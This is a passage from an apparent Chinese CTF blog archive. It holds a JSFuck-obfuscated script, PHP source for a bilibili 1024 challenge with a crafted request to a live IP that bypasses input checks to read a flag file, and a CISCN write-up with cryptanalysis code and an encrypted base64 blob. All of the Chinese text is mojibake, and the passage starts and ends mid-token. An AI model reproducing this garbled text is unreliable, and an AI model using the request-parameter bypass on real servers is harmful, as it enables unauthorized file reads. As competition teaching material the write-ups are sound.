+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])) ä¸€çœ‹å°±æ˜¯ JSFuckï¼Œç›´æ¥æµè§ˆå™¨é‡Œæ‰§è¡Œå¾—åˆ° \"var str1 = \\\"\\\\u7a0b\\\\u5e8f\\\\u5458\\\\u6700\\\\u591a\\\\u7684\\\\u5730\\\\u65b9\\\"; var str2 = \\\"bilibili1024havefun\\\"; console.log()\" str1 ä¸º ç¨‹åºå‘˜æœ€å¤šçš„åœ°æ–¹ ==&gt; GitHub GitHub ä¸Š æ‰¾åˆ°äº†è¿™é‡Œï¼ˆ https://github.com/interesting-1024/end/blob/main/end.php &lt;?php //filename end.php $bilibili = \"bilibili1024havefun\"; $str = intval($_GET['id']); $reg = preg_match('/\\d/is', $_GET['id']); if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){ $content = file_get_contents($_GET['url']); //æ–‡ä»¶è·¯å¾„çŒœè§£ if (false){ echo \"è¿˜å·®ä¸€ç‚¹ç‚¹å•¦ï½\"; }else{ echo $flag; } }else{ echo \"ä½ æƒ³è¦çš„ä¸åœ¨è¿™å„¿ï½\"; } ?&gt; http://120.92.151.189/blog/end.php ä½ æƒ³è¦çš„ä¸åœ¨è¿™å„¿ï½ æ„é€ payloadï¼š http://120.92.151.189/blog/end.php?id[]=1&amp;url=./flag.txt å¾—åˆ°ä¸‹å›¾ï¼Œæ–‡ä»¶åç§°ä¸º bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg åœ¨æ–‡ä»¶æœ€åè—äº† flag10ã€‚ 2ebd3b08-47ffc478-b49a5f9d-f6099d65 å¦å¤–å‘ç°è¿™ä¸ªurlåªè¦åŒ…å« flag.txt å°±è¿”å›è¿™ä¸ªã€‚ã€‚ ç›²çŒœ /.+flag\\.txt.*/ æ€»ç»“interesting-1024/end è¿™ä¸ªä»“åº“çš„ issue ç®€ç›´æˆäº†èŠå¤©å®¤â€¦â€¦ å¦å¤–ï¼Œæœ‰å¸ˆå‚…åœ¨ https://www.bilibili.com/blackboard/activity-20201024.html é¡µé¢ä¸Šå‘ç°äº†éšè—çš„å½©è›‹ã€‚ æ®è¯´å¤šæ¬¡åˆ·æ–°é‡å¯å¯è§¦å‘ã€‚ æ€ä¹ˆè¯´å‘¢ï¼Œæ€»çš„æ„Ÿè§‰ï¼Œè¿™äº›é¢˜ç›®æ›´åƒæ˜¯è„‘ç­‹æ€¥è½¬å¼¯ï¼Œç•¥åå¨±ä¹åŒ–è¿™æ ·å§ã€‚ å°±ä¸åƒæ­£ç»çš„ CTF é¢˜çš„æ„æ€ã€‚ è‡³äºç¬¬6ã€7ã€9é¢˜ï¼Œä¹Ÿæ²¡åšä¸‹å»çš„å…´è¶£äº†ã€‚ å°±è¿™æ ·å§ï¼Œä¸ç©äº†ï¼Œåƒç“œåƒç“œã€‚ æ›´æ–°äº 20201026 å‡Œæ™¨ ï¼ˆæºœäº†å–µ","path":"2020/10/26/CTF_2020bilibiliSec1024/"},{"title":"CTF | 2020 CISCN å›½èµ›æ€»å†³èµ› éƒ¨åˆ†è§£é¢˜å¤ç°","text":"å‰è¨€å¥½ä¸å®¹æ˜“ç»è¿‡çº¿ä¸Šåˆèµ›ã€åˆ†åŒºé€‰æ‹”èµ›ï¼Œç»ˆäºæœ‰æœºä¼šå»çº¿ä¸‹æ‰“äº†åœº CTF å›½èµ›ï¼Œæ„Ÿè°¢å¤§å¸ˆå‚…ä»¬å¸¦æˆ‘ç©~ è¾£é¸¡å¹³å°ï¼ˆylbnbï¼‰ä»€ä¹ˆçš„å°±ä¸åæ§½äº†ï¼Œæ€»çš„æ¥è¯´å›½èµ›å…¶å®è¿˜æŒºçˆ½çš„ 2333ï¼Œæ··åƒæ··å–åˆ’æ°´çš„æ˜¯æˆ‘äº†ã€‚ ç¬¬ä¸€å¤© AWD ä¸€å¼€å§‹è¢«æ‰“å¾—è´¼æƒ¨äº†ï¼Œä¸­é—´ä¿®å¹³å°è¿‡äº†ä¸€ä¸ªå°æ—¶ï¼Œæœ¬æ¥éƒ½æƒ³å¥½æ¥ä¸‹æ¥è¦æ€ä¹ˆæ‰“äº†ï¼Œæ¥ç€å¹³å°åˆå´©äº†è¿‡äº†å‡ ä¸ªå°æ—¶åƒäº†ä¸ªæ™šé¥­æœ€åè¯´ä¸æ‰“äº†ã€‚ã€‚ï¼ˆç¬¬ä¸€æ¬¡æ­£å¼æ‰“ AWD å°±æ˜¯å›½èµ›äº†ä¹Ÿå¤ªæƒ¨äº† ç¬¬äºŒå¤©æ”¹æˆäº†ä¸‰å°æ—¶ Break è§£é¢˜èµ› + ä¸¤å°æ—¶ Fixï¼Œè§£é¢˜åªä¼šç­¾åˆ°å˜¤å˜¤å˜¤ï¼ˆï¼ˆï¼ˆ è¶ç€è¿˜æœ‰ç‚¹å°è±¡å°±æ¥å¤ç°å‡ ä¸ªé¢˜å§ã€‚ ï¼ˆçŸ¥é“äº†æˆ‘è‡ªå·±çˆªå·´ CryptolockriseSource: import random import os from Crypto.Cipher import DES ''' sbox=list(range(256)) random.shuffle(sbox) print(sbox) ''' sbox=[217, 25, 248, 51, 6, 37, 32, 69, 96, 117, 86, 108, 155, 50, 27, 249, 171, 82, 168, 245, 228, 195, 118, 187, 12, 109, 99, 241, 26, 41, 194, 205, 236, 185, 73, 35, 139, 175, 44, 116, 48, 148, 22, 142, 190, 114, 201, 60, 59, 89, 181, 13, 10, 197, 151, 219, 87, 198, 191, 93, 152, 230, 34, 124, 173, 146, 226, 40, 101, 165, 83, 212, 206, 229, 16, 95, 56, 107, 144, 250, 149, 153, 208, 133, 145, 156, 172, 162, 113, 100, 183, 127, 57, 223, 130, 72, 135, 84, 147, 15, 242, 177, 42, 23, 122, 54, 0, 131, 166, 244, 88, 231, 94, 235, 29, 125, 7, 232, 110, 90, 179, 75, 220, 71, 251, 45, 243, 207, 58, 120, 184, 9, 39, 218, 63, 38, 254, 167, 140, 53, 213, 214, 80, 85, 128, 8, 64, 174, 132, 233, 65, 200, 36, 115, 215, 192, 74, 203, 11, 134, 104, 170, 160, 227, 169, 246, 141, 221, 52, 21, 20, 47, 199, 33, 216, 182, 188, 143, 138, 102, 202, 105, 79, 49, 253, 30, 121, 103, 137, 1, 211, 150, 5, 55, 196, 247, 240, 178, 159, 24, 81, 224, 210, 67, 157, 91, 28, 18, 186, 126, 237, 98, 252, 2, 239, 43, 180, 209, 238, 225, 68, 119, 66, 46, 61, 17, 31, 112, 62, 158, 189, 234, 193, 111, 204, 19, 77, 222, 164, 14, 97, 3, 70, 255, 78, 129, 163, 92, 76, 4, 123, 176, 106, 161, 154, 136] def lock(m): r=[] for i in m: r.append(sbox[i]) return r def peak(m): r=m[-1:]+m[0:-1] return r def rise(m,k): assert len(m)==len(k) r=[] for i in range(len(m)): r.append(m[i]^k[i]) return r key=os.urandom(8) secret=[1,2,3,4,5,6,7,8] r=lock(secret) r=peak(r) r=rise(r,key) r=lock(r) r=peak(r) r=rise(r,key) print(\"lockrise:\",r) print(\"k0 ^ k7:\",key[0]^key[-1]) secret=os.urandom(8) r=lock(secret) r=peak(r) r=rise(r,key) r=lock(r) r=peak(r) r=rise(r,key) print(\"encrypted:\",r) d=DES.new(secret,DES.MODE_ECB) flag=b\"flagxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" print(d.encrypt(flag).hex()) Output: lockrise: [158, 51, 193, 48, 114, 23, 164, 217] k0 ^ k7: 160 encrypted: [32, 98, 40, 152, 125, 149, 87, 167] 0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c åŠ å¯†é€»è¾‘ï¼š input =&gt; sbox =&gt; right shift =&gt; xor key =&gt; sbox =&gt; right shift =&gt; xor key =&gt; output æ±‚è§£ flag é€»è¾‘ï¼š æ±‚è§£ key =&gt; æ ¹æ® key å’Œ encrypted åå‘è§£å‡º secret =&gt; ç”¨ secret ä½œå¯†é’¥ DES è§£å¯† flag å†æ¥çœ‹åŠ å¯†è¿‡ç¨‹ï¼Œinput0 =&gt; sbox =&gt; right shift =&gt; xor k1 =&gt; sbox =&gt; right shift =&gt; xor k2 =&gt; output2. åæ¨å¯ä»¥å¾—åˆ° input6 =&gt; sbox =&gt; right shift =&gt; xor k7 =&gt; sbox =&gt; right shift =&gt; xor k0 =&gt; output0. è¿™æ ·æ ¹æ® k0 ^ k7 = 160 å¯ä»¥çˆ†ç ´ k0 &amp; k7 äº†ã€‚ secret=[1,2,3,4,5,6,7,8] r=lock(secret) r=peak(r) # [96, 25, 248, 51, 6, 37, 32, 69] å‰ä¸¤æ­¥éª¤åŠ å¯†éƒ½æ˜¯ç¡®å®šçš„ï¼Œå¯ä»¥ç›´æ¥ä»è¿™é‡Œå…¥æ‰‹äº†ã€‚ r = [96, 25, 248, 51, 6, 37, 32, 69] lockrise = [158, 51, 193, 48, 114, 23, 164, 217] for k7 in range(256): k0 = 160 ^ k7 if sbox[r[7] ^ k7] ^ k0 == lockrise[0]: print(k0, k7) # 0 160 å¾—åˆ° k0 å’Œ k7 åˆ†åˆ«ä¸º 0 å’Œ 160. å†å°† k0 å¸¦å…¥æ±‚è§£ k1. k0 = 0 for k1 in range(256): if sbox[r[0] ^ k0] ^ k1 == lockrise[1]: print(k1) # 180 ä¾æ¬¡æ±‚è§£ä¸‹å»å³å¯å¾—åˆ°keyã€‚ æˆ–è€…å†™ä¸ªå¾ªç¯æ±‚ä¹Ÿè¡Œã€‚ key = [0] for i in range(0, 7): for k in range(256): if sbox[r[i] ^ key[i]] ^ k == lockrise[i + 1]: print(i, k) key.append(k) break print(key) # [0, 180, 224, 60, 139, 193, 154, 160] æ‰€ä»¥ key ä¸º [0, 180, 224, 60, 139, 193, 154, 160]ã€‚ è€Œååè¿‡æ¥æ±‚è§£ secretã€‚ key = [0, 180, 224, 60, 139, 193, 154, 160] def inv_rise(m, k): assert len(m) == len(k) r = [] for i in range(len(m)): r.append(m[i] ^ k[i]) return r def inv_peak(m): r = m[1:] + m[0:1] # left shift return r def inv_lock(m): r = [] for i in m: r.append(sbox.index(i)) return r encrypted = [32, 98, 40, 152, 125, 149, 87, 167] x = inv_rise(encrypted, key) x = inv_peak(x) x = inv_lock(x) x = inv_rise(x, key) x = inv_peak(x) x = inv_lock(x) print(x) # [35, 239, 81, 231, 237, 218, 108, 166] å¾—åˆ° secret ä¸º [35, 239, 81, 231, 237, 218, 108, 166]ã€‚ secret = [35, 239, 81, 231, 237, 218, 108, 166] flag = bytes.fromhex( \"0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c\") # æˆ–è€… # import binascii # flag = binascii.unhexlify( # \"0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c\") from Crypto.Cipher import DES d = DES.new(bytes(secret), DES.MODE_ECB) print(d.decrypt(flag)) # b'flag{lock_peak_rise_repeat_2333_7481233}' å¾—åˆ° flagã€‚ Miscç­¾åˆ° c3ludHt0MmpkZ2dqc2NuYTM2ZWwyfQ== base64 decode synt{t2jdggjscna36el2} å‡¯æ’’ flag{g2wqttwfpan36ry2} BadPicå›¾ç‰‡æ®‹ç¼ºäº†ï¼Œæ‹–è¿› 010editor é‡Œä¸€çœ‹ï¼Œå‘ç°æ–‡ä»¶æœ€åé¢æœ‰ä¸€å †å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å‘ç°ä»¥ Saltedå¼€å¤´ï¼Œç›²çŒœç”¨äº† openssl ä»€ä¹ˆåŠ å¯†å§ã€‚ å¦å¤– PNG_CHUNK chunk[8] çš„ length ä¸º 0ã€‚ äºæ˜¯å…ˆæ‰‹åŠ¨ç®—äº†ç®—å†è¯•äº†è¯•é•¿åº¦ï¼Œæ˜¯ 21535ã€‚ï¼ˆæœ‰æ²¡æœ‰ä»€ä¹ˆè„šæœ¬èƒ½ç›´æ¥ç®—çš„å”‰ï¼Œæ‰‹ç®—æ„Ÿè§‰å¥½è ¢ ä¿®æ”¹åå¾—åˆ°å®Œæ•´çš„å›¾ç‰‡ã€‚ apacheï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯åŠ å¯†çš„å¯†é’¥äº†ã€‚ æŠŠå›¾ç‰‡æœ«å°¾çš„å­—ç¬¦ä¸²ç»™æå–å‡ºæ¥ï¼Œå»æ‰ IDAT ç­‰æ ‡è¯†ï¼ˆè¿˜æ˜¯å¤ç°çš„æ—¶å€™å‘ç°è¦è¿™æ ·æ•´ï¼‰ï¼Œåˆå¹¶ä¸¤æ®µ chunkã€‚ U2FsdGVkX1/Ofx56tIWCux0AX/p4s03W2eEQcTQzYayvGRDjQP9e8rtfVCtrFRUH1kC6YCKUJllScPEArUd61ppoSIhkVR+KBFZK2QdWZNZLXlZqlXUICmBLBtjlY4frBvyP2N+kjJofz0L+zSdWlC+eGqwHrx0u+/ri1ttLnDcSFBNA2fUPeKsYRH/7+wNq+PL/o98qN83J/DNIOoLFYzgP3Tj0Rz9++IXqnkzD0lwAib87pnz912PREL6Qr8Yoff57zNlhBsj8URJY59oIXnO7ZHQO1Gl43I+iYHIltG84M1TOBnhO71BNiCumRYiL2QBxvSqaMeg7XWMjPekE+MQhWSWQW4DiyUS5kq2+maLUEvTVvIyIX/75u/RoyazBBAu99oFlKYeVqBugA8PI2LdFAdBIFhTICNFUWX/G9f4tUtI9BYemTZ9cXQ9Q7alUmS6QqA0cZKEPZ9W3WZLltevTQofTvwQBkYFuKibOkTl5NfV4evnhagG1MNVrXvQaArdMYUoiWKzf+8usF94yRKYL+HQmnjw1n4XklPJHeeZfouQZedcTukou3CBeyHFhkaqoukz//b3ypzJnSgTQOAP+OVuWzIBcH+4oUdb4R6Lu/qsZ753s4gV3pdJYKCTxU+JAl4LRk0PE2ArENxD3oz7x991pP7t2zK6pmPIAptDO0xep8mR8H34VGAWOOeXFicZOFW0OfLIo2tyWWCHesJB1pa9eodwJcFw3gZXPDbCGJHUeXGFk55xcH0S0xKzNF0fO/Qfs/8uog1NU+BfpUbkb3k7fRUVYKHfzZD1VaqnGMlyh71tszfT3+HU5HSCvuicn9P6Xy4/oBNrQozbpcvYA2rKwurUXV5zvL9ff7/M8c7lrhZhzCHOlkHghtkBbBER7h6FhcBoJ2Ahtc5NjoOdzzXKsGjtQXdU/VIhwjFjD1MLw9xlrLH18hRXTvUxmGYcv5oo4iY0NRWLW81hrInFCAIyHw3iusANxz9MvKuE7ZdrHMNmwUnKm0Mn2qyHW7zTLiGnqfc2bjpnGp3D/unFzspFiYqlVUZyeti+s2JUeIU08zoZ28iDexBf1qAeoG4trvBfMboEF/iuR1U+b60e7Wj6uDLmTtx2yPMomTYp4nNzePdJU82kbq1lR1oROwbToFGZ7bzdD/J8ML0WwKHUKhe3LwC0klgab0X2BEaNkDGH1Yp4p1z/+2YSIcjXlccgw2slhuytfmc3DcdmaY45lWc+Hn267MLftVGPufFStd5Z/OHbqmjReVil/jv2N/sixpJofz53+W4n9URPhTDnlV6lEWLMOPpEytSYRSXUKjS2rrTdhJEu0e6F1VxLzL81zTgcLEo5JFwQyD2kTTaLXYeaZ2bDNnf02UxFd12Qup5+uRnLUhOotatddnTtKd2YGghpTCWfgYK5JlEeTgUUgDuJdvXFgNUQfl77ip6ljogwJss3LB5B28tUI9NXDDhJxMMcqloAiYPR3uPDexitNiA1X87N0kKYPWZoOgC9yyeVZyAfG37dohnu90kmXkmO+YAGvFS2wi6P/fSQbag9IY64ssQ3AtqlyBMV/Svz+aHjEPXBQD4rAdviNu0HOk0R57A7ocJVsTS5eq0wvSZw9tTA8v+kXBDQlBC0UKI9IQC48b5e620hO7KnYw5DGtG26qBFRF7p8PwQjVmUI64MIAGZ0zQUoZPie7J4vY4jv4kZvsrlNznlMi5wKoXkRpygexYoFINv39FYAo6YlUcOhW9LPAnw/g1BMx3aaai/9VlE5fG+0knRko7qJ1tG90nN6EmoE/qWI0Vu3LILetum18XW7jscmWO4TQEzrWxQwMBu1HC+DM2amNpUpQFJZrMogr7hNnya9OdPhug6GzJ9UVeEN6G/4G2WwifpSN8+nm2CstbrCx5q2lN8iYMUqXxfqCknWeNtpXpTTeg22bn9FOaXHNJ6lsugDzN0xhS1b6mk/M5qILj4kbm9B0pZbhGsvgytGzFBsXVKwv7ZCzqSbIGjg4dNCpVZQoEy3mxgebjfXwXwHzmHibV1rK1EKd9f4wc1/1u8ZQ8uT6cOJT5SGlLbug/raELuxkpSizpzHXoXoy2TgIwOByrVQmlpBN4u+BGgi7Tuejeq+1l692Ng0QQU0gk0bc2GZduh/jyDMV2za0kasX7zaVg5rbk+UwzF6t6WMwx5tN6fpZ0qm+JF8kOlHeYNWY3HgFz7qi0/iq4Rie/+3eGzEgcN2S8dEBwmF0i33iHTNiTbyaSq5uwBtUJPoFa6R1EPKCSPp7ohyU/TZjk4nFFQuDmIVhMISYs2KInfQOnoa5B/NoRW/lv7Cp/9MrS6tTuIXbcIVa1L61xJYs8x9t3G6ygfKA7Jv02hrbZKrycP83m1ZF89HA00r37EUfsyerTJ2XjQ2oqoA8/D5458xQ5TTr/Ta06GqOzQTs1yIODzzW/pVIAlWQlHEF7xkiYI4+LtPm3RdHjiGxfnzGdUhSjqT/GhpOI/9f62dgTo+koHQIQvlSH1h3rtD1EAj622xslKmtU2iURBlcPphQE91ABVieormgksiov2atQZU27hlcrYyJfMXmZLcrSQz1m17M3H/pnS3jh0kiCK95yxBzA7+NIchZBCDoR3BjUbxX43aA8UDPLl6aZGRqY+1IWboHOOm8N16/ywLSsZGn5Y8tibzQqidpYDjssAHdXsFTKc2NZpJUgvG62Qh1nLhItl8pcm46sdLo7hgAa2WIyyxRVacQOsXk322VFyT61TlPJidMWqhld0/0RaoMJjXpmWyND4sBpIOyXigAuTG7zZap0Eh1per2stoHHW7+8ZSLA0KiSY9U5Ek0A5+weCuLWVjaUu6reanKYvufewQHp4/mx/AFrJvUrmY8noxKUw7BSmzrLopoKgRLZLDUwp1JKkKkLl37sl1NdgJAPDL2CFXe3mhG